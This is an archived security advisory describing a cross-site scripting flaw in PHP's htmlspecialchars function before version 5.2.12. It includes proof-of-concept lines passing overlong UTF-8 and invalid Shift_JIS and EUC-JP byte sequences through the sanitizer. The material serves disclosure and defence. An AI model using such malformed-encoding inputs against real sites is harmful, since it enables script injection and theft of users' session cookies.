source: http://www.securityfocus.com/bid/37389/info

PHP is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.

An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.

NOTE: In some configurations, attackers may exploit this issue to carry out HTML-injection attacks.

Versions prior to PHP 5.2.12 are vulnerable. 

// overlong UTF-8 sequence
echo htmlspecialchars("A\xC0\xAF&",     ENT_QUOTES, 'UTF-8');
// invalid Shift_JIS sequence
echo htmlspecialchars("B\x80&",         ENT_QUOTES, 'Shift_JIS');
echo htmlspecialchars("C\x81\x7f&",     ENT_QUOTES, 'Shift_JIS');
// invalid EUC-JP sequence
echo htmlspecialchars("D\x80&",         ENT_QUOTES, 'EUC-JP');
echo htmlspecialchars("E\xA1\xFF&",     ENT_QUOTES, 'EUC-JP');
echo htmlspecialchars("F\x8E\xFF&",     ENT_QUOTES, 'EUC-JP');
echo htmlspecialchars("G\x8F\xA1\xFF&", ENT_QUOTES, 'EUC-JP');
